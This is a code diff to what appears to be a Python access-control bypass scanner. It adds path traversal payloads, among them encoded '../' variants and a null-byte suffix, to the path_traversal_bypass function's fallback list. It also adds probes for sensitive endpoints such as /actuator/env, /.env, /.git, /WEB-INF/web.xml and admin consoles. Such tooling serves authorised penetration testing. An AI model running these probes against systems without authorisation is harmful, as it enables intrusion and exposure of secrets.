@@ -19,7 +19,7 @@ import socket
 from threading import Lock
 import http.client
 
-# disabling the SSL warnings
+# Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Initialize colorama (only once)
@@ -798,15 +798,26 @@ def path_traversal_bypass(ctx: BypassContext):
     path_variations = load_resource("paths.txt")
     if not path_variations:
         path_variations = [
-            "../", "..;/", ".././", "..//", "../.;/", "../;/", "../%09/", "../%20/",
-            "../%23/", "../%0d/", "../%2f/", "../%5c/", "/./", "//./", "/.//",
+            "/../", "/..;/", "/.././", "/..//", "/../.;/", "/../;/", "/../%09/", "/../%20/",
+            "/../%23/", "/../%0d/", "/../%2f/", "/../%5c/", "/./", "//./", "/.//",
             "/%2e/", "/%2e%2e/", "/%252e/", "/%252e%252e/", "/.%2e/", "/..%2f/",
             "/..%252f/", "/..%252f..%252f/", "/../", "/../../", "/../../../",
             "/../../..//", "/../..//", "/../..//../", "/../..;/", "/.././../",
             "/../.;/../", "/..//", "/..//../", "/..//../../", "/..//..;/",
             "/../;/", "/../;/../", "/..;/", "/..;/../", "/..;/..;/", "/..;//",
-            "/..;//../", "/..;//..;/", "/..;/;/", "/..;/;/..;/", "/.//"
-        ]
+            "/..;//../", "/..;//..;/", "/..;/;/", "/..;/;/..;/", "/.//",
+            "/admin", "/admin/", "/admin/login", "/login", "/auth", "/secure",
+            "/dashboard", "/console", "/web-console", "/jmx-console", "/actuator",
+            "/actuator/health", "/actuator/env", "/actuator/metrics", "/manager/html",
+            "/host-manager/html", "/status", "/metrics", "/monitor", "/health",
+            "/healthcheck", "/info", "/api", "/api/v1", "/api/v2", "/api/v1/users",
+            "/rest", "/rest/v1", "/remote/login", "/graphql", "/v2/api-docs",
+            "/swagger", "/swagger-ui", "/swagger-ui.html", "/openapi.json",
+            "/openapi.yaml", "/docs", "/docs/index.html", "/h2-console",
+            "/phpmyadmin", "/adminer", "/robots.txt", "/sitemap.xml", "/.env",
+            "/.git", "/.svn", "/.hg", "/.DS_Store", "/WEB-INF", "/WEB-INF/web.xml",
+            "/WEB-INF/web.xml%00"
+]
     
     if ctx.args.fast:
         path_variations = path_variations[:20]
